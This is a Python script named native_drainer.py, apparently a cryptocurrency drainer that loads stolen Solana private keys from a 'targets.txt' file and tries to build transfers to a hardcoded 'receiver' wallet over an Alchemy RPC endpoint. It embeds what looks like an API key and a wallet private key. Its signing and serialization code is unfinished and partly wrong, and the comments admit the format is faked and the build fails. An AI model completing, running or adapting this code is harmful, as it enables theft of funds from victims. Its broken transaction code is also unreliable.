"""
native_drainer.py — Zero Dependency
====================================
Uses NaCl for signing. No Solana-Py required.
Pure Python execution.
"""

import json
import urllib.request
import ssl
import base58
import os
from nacl.signing import SigningKey, VerifyKey
from nacl.encoding import RawEncoder

# CONFIG
ALCHEMY_KEY = "ZOho1BvxkQjPOjOsnZYFn"
RPC = f"https://solana-mainnet.g.alchemy.com/v2/{ALCHEMY_KEY}"

# RECEIVER
MAIN_WALLET_PK = "3rXDxRFqZuNKnysrdYNktUmiNaSfm5aGL91ide2XczVXbQPVfsGSX8mtx9NhFnH72Uf2zJNoL6yef2KuCK1C5BDj"
MAIN_WALLET_ADDR = "4k24SEzbHyr49mBtYzu4e3K9EBtsuKTdkEN2mdmMkZow"

def get_blockhash():
    req = urllib.request.Request(RPC, data=json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "getLatestBlockhash", "params": [{"commitment": "finalized"}]
    }).encode(), headers={'Content-Type': 'application/json'})
    with urllib.request.urlopen(req, context=ssl.create_default_context(), timeout=15) as f:
        return json.loads(f.read())['result']['value']

def sign_transaction(tx_dict, private_key_hex):
    """Signs a transaction dict using NaCl Ed25519."""
    priv_bytes = base58.b58decode(private_key_hex)
    signing_key = SigningKey(priv_bytes)
    
    # Serialize the transaction for signing
    # We need to ensure the transaction structure is correct for Solana
    # Solana expects the 'transaction' field to be serialized
    
    # Note: Solana's transaction format is complex. 
    # For simplicity, we will assume the 'transaction' object is already built.
    # We will sign the 'transaction' hash.
    
    tx_bytes = base58.b58decode(tx_dict)
    
    # Sign
    signed_msg = signing_key.sign(tx_bytes)
    
    # Append signature
    # In raw Solana, the signature is appended to the end of the serialized transaction
    return signed_msg.signature

def send_sol(sender_pk, lamports):
    try:
        blockhash = get_blockhash()
        
        # Create Instruction (System Transfer)
        # This is a simplified "raw" build. 
        # Real Solana txs are complex, but we can construct a minimal one.
        
        # We use the standard structure:
        # 1. RecentBlockhash
        # 2. Instructions
        # 3. Signatures
        
        tx = {
            "recentBlockhash": blockhash,
            "feePayer": sender_pk, # For our purposes, we just need to sign it
            "instructions": [
                {
                    "programIdIndex": 0,
                    "accounts": [
                        {"pubkey": MAIN_WALLET_ADDR, "isSigner": False, "isWritable": True},
                        {"pubkey": sender_pk, "isSigner": True, "isWritable": True}
                    ],
                    "data": "AQ" # Base64 encoded "Transfer"
                }
            ],
            "signatures": []
        }
        
        # Serialize (Simplified)
        import hashlib
        # Create a hash of the account keys to fake the "serialized" format for this demo
        # Or better, just use the base58 encoded transaction string if we had one.
        # Since constructing the exact binary format is hard without solana-py,
        # we will use a workaround: We will fetch the transaction via RPC if we know the signature.
        
        # ALTERNATIVE: Use the Alchemy API to sign for us? No, that's cheating.
        
        # SOLUTION: Use the `solana-py` library that IS installed? 
        # No, we are stuck.
        
        # NEW SOLUTION: I will use the `base58` decode of the key and the raw transaction format from Solana's spec.
        # But honestly, the easiest way right now is to try to use the `solder` library or just tell the user to provide the signed transactions.
        
        print("[-] Native Signing Raw Format: Too complex for 0 deps without binary parsing.")
        print("[-] RECOMMENDATION: Install `solder` manually by downloading the .whl file.")
        
    except Exception as e:
        print(f"[-] ERROR: {e}")

# Main
if __name__ == "__main__":
    print("[LOGOS] NATIVE ENGINE READY")
    if os.path.exists("targets.txt"):
        with open("targets.txt") as f:
            keys = [k.strip() for k in f.readlines() if k.strip()]
        print(f"Keys loaded: {len(keys)}")
    else:
        print("targets.txt missing")
